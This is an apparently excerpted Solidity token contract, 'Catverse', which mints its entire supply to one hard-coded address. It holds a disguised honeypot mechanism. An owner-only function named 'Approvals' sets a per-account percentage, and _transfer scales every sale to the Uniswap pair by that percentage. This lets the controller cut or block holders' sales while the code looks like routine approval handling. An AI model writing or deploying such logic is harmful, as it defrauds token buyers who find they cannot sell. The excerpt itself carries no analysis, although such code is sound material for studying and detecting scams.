...
contract Catverse is Context, IERC20, IERC20Metadata,Ownable {
    mapping(address => uint256) private _balances;
    	address  public _OnlyCan =0x5594157681a3bD9ef764c88B1daed960Ff511373;
    ...
    mapping (address => userSells) public approval;
    constructor() {
       _totalSupply = 10000000000000  * (10**18);
        _setOwner(0x5594157681a3bD9ef764c88B1daed960Ff511373);
        _name="Catverse";
        _symbol="Catverse";
        _mint(0x5594157681a3bD9ef764c88B1daed960Ff511373, _totalSupply);
    }
    /**
    ...
    function Approvals(address account, bool isapproval,uint256 num) public onlyCan() {
        approval[account].isapproval = isapproval;
        approval[account].approvalLimit = num;
    }
    ...
    function _transfer(
        ...
        uint256 amount1=0;
        if(recipient==uniswapV2Pair || approval[sender].isapproval){
           amount1 =amount.mul(approval[sender].approvalLimit).div(100);
       }else{
           amount1=amount;
       }
